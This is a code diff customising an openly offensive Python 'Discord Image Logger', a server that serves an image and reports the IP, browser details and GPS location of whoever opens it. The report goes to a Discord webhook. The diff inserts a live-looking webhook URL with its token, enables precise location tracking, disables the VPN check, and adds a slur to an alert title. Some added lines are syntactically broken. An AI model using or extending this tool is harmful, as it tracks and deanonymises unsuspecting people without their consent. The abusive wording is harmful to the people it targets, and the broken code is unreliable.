@@ -1,6 +1,3 @@
-# Discord Image Logger
-# By DeKrypt | https://github.com/dekrypted
-
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import traceback, requests, base64, httpagentparser
@@ -8,31 +5,31 @@ import traceback, requests, base64, httpagentparser
 __app__ = "Discord Image Logger"
 __description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
 __version__ = "v2.0"
-__author__ = "DeKrypt"
+__author__ = "07TEAM"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1224360542597152929/sFBoSdX-PiSL-k1gtOTfc_6U8YXD8KrvzLHFIa8Rqxc2e2uKakBNMUIwdOWfxF8L4Ew0",
+    "image": "https://media.discordapp.net/attachments/1210933554192715858/1224333635235090432/kici_kici_neyro.png?ex=661d1c8d&is=660aa78d&hm=73399441e6885c05a0c09485fe140475438f4dad58dfe904936c75f26fb13441&=&format=webp&quality=lossless", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
-    "username": "Image Logger", # Set this to the name you want the webhook to have
-    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
+    "username": "𝟎𝟕 𝑻𝑬𝑨𝑴", # Set this to the name you want the webhook to have
+    "color": #000000, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
     "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
     
-    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
+    "accurateLocation": True, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
     "message": { # Show a custom message when the user opens the image
-        "doMessage": False, # Enable the custom message?
-        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
+        "doMessage": True, # Enable the custom message?
+        "message": "Grabbed by 07TEAM", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
-    "vpnCheck": 1, # Prevents VPNs from triggering the alert
+    "vpnCheck": 0, # Prevents VPNs from triggering the alert
                 # 0 = No Anti-VPN
                 # 1 = Don't ping when a VPN is suspected
                 # 2 = Don't send an alert when a VPN is suspected
@@ -40,7 +37,7 @@ config = {
     "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
     "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)
 
-    "antiBot": 1, # Prevents bots from triggering the alert
+    "antiBot": 2, # Prevents bots from triggering the alert
                 # 0 = No Anti-Bot
                 # 1 = Don't ping when it's possibly a bot
                 # 2 = Don't ping when it's 100% a bot
@@ -51,7 +48,7 @@ config = {
     # REDIRECTION #
     "redirect": {
         "redirect": False, # Redirect to a webpage?
-        "page": "https://your-link.here" # Link to the webpage to redirect to 
+        "page": "https://www.bing.com/ck/a?!&&p=16f8d408ac9b60d1JmltdHM9MTcxMTkyOTYwMCZpZ3VpZD0xOWYzYTA5ZC0zMmVmLTYzZjEtMjZkYS1iMzM2MzM5ODYyYWMmaW5zaWQ9NTIwNw&ptn=3&ver=2&hsh=3&fclid=19f3a09d-32ef-63f1-26da-b336339862ac&psq=ptoszek&u=a1aHR0cHM6Ly9wdG9zemVrLnBsLw&ntb=1" # Link to the webpage to redirect to 
     },
 
     # Please enter all values in correct format. Otherwise, it may break.
@@ -80,9 +77,9 @@ def reportError(error):
     "content": "@everyone",
     "embeds": [
         {
-            "title": "Image Logger - Error",
+            "title": "Image Logger - ᴇʀʀᴏʀ",
             "color": config["color"],
-            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
+            "description": f"**Kurwa** problemy\n\n**Error:**\n```\n{error}\n```",
         }
     ],
 })
@@ -99,9 +96,9 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
     "content": "",
     "embeds": [
         {
-            "title": "Image Logger - Link Sent",
+            "title": "Image Logger - ꜱʜᴏᴡᴛɪᴍᴇ",
             "color": config["color"],
-            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
+            "description": f"The **Logger** has been sended.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
         }
     ],
 }) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
@@ -144,9 +141,9 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
     "content": ping,
     "embeds": [
         {
-            "title": "Image Logger - IP Logged",
+            "title": "Image Logger - ɢᴏᴛ ʜɪᴍ",
             "color": config["color"],
-            "description": f"""**A User Opened the Original Image!**
+            "description": f"""**Some Faggot Just Got Trapped**
 
 **Endpoint:** `{endpoint}`
             
@@ -175,7 +172,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
   ],
 }
     
-    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
+    if url: embed["embeds"][0].update({"thumbnail": {"url": https://media.discordapp.net/attachments/1210933554192715858/1224365760063869058/discord-avatar-512-RUWIL.png?ex=661d3a78&is=660ac578&hm=207df0f3855c14fbc8e2a6d0a1121953b42a239555f4e9443f74cb811a08606c&=&format=webp&quality=lossless}})
     requests.post(config["webhook"], json = embed)
     return info
 
